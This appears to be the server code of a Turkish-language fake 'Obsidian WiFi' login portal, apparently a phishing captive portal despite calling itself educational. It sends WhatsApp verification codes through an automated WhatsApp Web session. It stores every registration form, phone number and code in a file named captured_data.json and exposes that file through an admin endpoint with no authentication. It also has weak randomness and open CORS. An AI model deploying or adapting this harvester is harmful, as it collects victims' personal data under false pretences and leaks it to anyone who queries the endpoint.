process.on('uncaughtException', (err) => {
    console.error('--- UNCAUGHT EXCEPTION ---');
    console.error(err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('--- UNHANDLED REJECTION ---');
    console.error(reason);
});

const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcodeTerminal = require('qrcode-terminal');
const QRCode = require('qrcode');

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(bodyParser.json());

// Serve static files from the React app
app.use(express.static(path.join(__dirname, '../client/dist')));

// --- Admin & WhatsApp State ---
let latestQR = null;
let connectionStatus = 'INITIALIZING'; // 'INITIALIZING', 'QR_REQUIRED', 'AUTHENTICATING', 'READY', 'DISCONNECTED'

// --- WhatsApp Client Initialization ---
const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: {
        executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/google-chrome-stable',
        headless: true,
        dumpio: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--no-first-run',
            '--no-zygote',
            '--disable-gpu',
            '--hide-scrollbars',
            '--mute-audio'
        ],
    }
});

client.on('qr', async (qr) => {
    connectionStatus = 'QR_REQUIRED';
    console.log('--- WHATSAPP LOGIN REQUIRED ---');
    qrcodeTerminal.generate(qr, { small: true });

    // Convert QR to Base64 for web admin
    try {
        latestQR = await QRCode.toDataURL(qr);
    } catch (err) {
        console.error('QR Conversion Error:', err);
    }
});

client.on('ready', () => {
    connectionStatus = 'READY';
    latestQR = null;
    console.log('--- WHATSAPP CLIENT IS READY ---');
});

client.on('authenticated', () => {
    connectionStatus = 'AUTHENTICATING';
    console.log('--- WHATSAPP AUTHENTICATED ---');
});

client.on('disconnected', () => {
    connectionStatus = 'DISCONNECTED';
    console.log('--- WHATSAPP DISCONNECTED ---');
});

// Log directory
const logDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir);
}

const logFile = path.join(logDir, 'captured_data.json');

// --- Start Server BEFORE WhatsApp Init for Cloud Run health checks ---
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Educational Backend Server is running on port ${PORT}`);
});

// Initialize WhatsApp with timeout to prevent hanging
const initWhatsApp = async () => {
    try {
        console.log('--- INITIALIZING WHATSAPP CLIENT ---');
        
        // Timeout mechanism: If it takes more than 2 minutes to init, something is wrong
        const timeout = setTimeout(() => {
            if (connectionStatus === 'INITIALIZING') {
                console.error('--- WHATSAPP INIT TIMEOUT REACHED ---');
                connectionStatus = 'DISCONNECTED';
            }
        }, 120000);

        await client.initialize();
        clearTimeout(timeout);
    } catch (err) {
        console.error('WhatsApp Initialization Error:', err);
        connectionStatus = 'DISCONNECTED';
    }
};

initWhatsApp();

// --- In-Memory Verification Codes ---
const verificationCodes = new Map(); // phone -> { code: '123456', expires: timestamp }

// --- API Endpoints ---

app.post('/api/register', (req, res) => {
    const userData = req.body;
    const timestamp = new Date().toISOString();
    const entry = { timestamp, type: 'REGISTRATION', ...userData };

    console.log('--- NEW REGISTRATION DATA ---');
    console.table(userData);

    let logs = [];
    if (fs.existsSync(logFile)) {
        const fileContent = fs.readFileSync(logFile, 'utf-8');
        try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
    }
    logs.push(entry);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

    res.status(200).json({
        message: 'Kayıt başarılı. Giriş sayfasına yönlendiriliyorsunuz.',
        status: 'success'
    });
});

app.post('/api/request-code', async (req, res) => {
    let { phone } = req.body;
    const timestamp = new Date().toISOString();

    if (connectionStatus !== 'READY') {
        return res.status(503).json({
            message: 'WhatsApp bağlantısı henüz hazır değil. Lütfen admin panelinden veya terminalden bağlantıyı kurun.',
            status: 'error'
        });
    }

    const generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
    verificationCodes.set(phone, {
        code: generatedCode,
        expires: Date.now() + 5 * 60 * 1000
    });

    try {
        let formattedPhone = phone.replace(/\D/g, '');
        if (formattedPhone.startsWith('0')) {
            formattedPhone = '90' + formattedPhone.substring(1);
        } else if (!formattedPhone.startsWith('90')) {
            formattedPhone = '90' + formattedPhone;
        }

        const chatId = formattedPhone + "@c.us";
        const message = `*DOĞRULAMA KODU*\n\nObsidian WiFi ağına erişim için doğrulama kodunuz: *${generatedCode}*\n\nLütfen bu kodu giriş ekranına giriniz.`;

        await client.sendMessage(chatId, message);

        let logs = [];
        if (fs.existsSync(logFile)) {
            const fileContent = fs.readFileSync(logFile, 'utf-8');
            try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
        }
        logs.push({ timestamp, type: 'CODE_REQUEST', phone, sentCode: generatedCode });
        fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

        res.status(200).json({
            message: 'Doğrulama kodu WhatsApp üzerinden gönderildi.',
            status: 'success'
        });
    } catch (error) {
        console.error('WhatsApp Error:', error);
        res.status(500).json({
            message: 'Kod gönderilirken bir hata oluştu.',
            status: 'error'
        });
    }
});

app.post('/api/login', (req, res) => {
    const { phone, smsCode } = req.body;
    const timestamp = new Date().toISOString();

    const storedData = verificationCodes.get(phone);
    const isValid = storedData && storedData.code === smsCode && Date.now() < storedData.expires;

    let logs = [];
    if (fs.existsSync(logFile)) {
        const fileContent = fs.readFileSync(logFile, 'utf-8');
        try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
    }
    logs.push({ timestamp, type: 'LOGIN_ATTEMPT', phone, enteredCode: smsCode, success: isValid });
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

    if (isValid) {
        verificationCodes.delete(phone);
        res.status(200).json({
            message: 'Giriş başarılı. Sisteme yönlendiriliyorsunuz.',
            status: 'success'
        });
    } else {
        res.status(401).json({
            message: 'Geçersiz veya süresi dolmuş doğrulama kodu.',
            status: 'error'
        });
    }
});

// --- ADMIN ENDPOINTS ---

app.get('/api/admin/status', (req, res) => {
    let logs = [];
    if (fs.existsSync(logFile)) {
        const fileContent = fs.readFileSync(logFile, 'utf-8');
        try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
    }

    res.status(200).json({
        status: connectionStatus,
        qr: latestQR,
        logs: logs.reverse().slice(0, 50) // Son 50 kayıt
    });
});

// The "catchall" handler: for any request that doesn't
// match one above, send back React's index.html file.
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../client/dist/index.html'));
});
